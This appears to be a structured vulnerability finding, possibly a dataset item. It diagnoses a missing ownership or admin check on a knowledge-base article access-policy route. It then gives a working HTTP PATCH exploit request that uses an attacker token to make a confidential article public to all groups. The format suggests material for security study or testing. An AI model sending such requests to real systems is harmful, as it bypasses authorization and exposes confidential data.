diagnosis: The route updates access policies and confidentiality classifications on a Beanie Document via an atomic Set update. It retrieves the article solely by article_id without verifying that current_user.id matches article.author_id or that the user has administrative privileges over the article's knowledge base.
exploit_request:
PATCH /knowledge/articles/65c81f09e8432a1012fa0034/access-policy HTTP/1.1
Host: docs.saasplatform.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"allowed_groups": ["*"], "is_confidential": false, "public_preview": true}
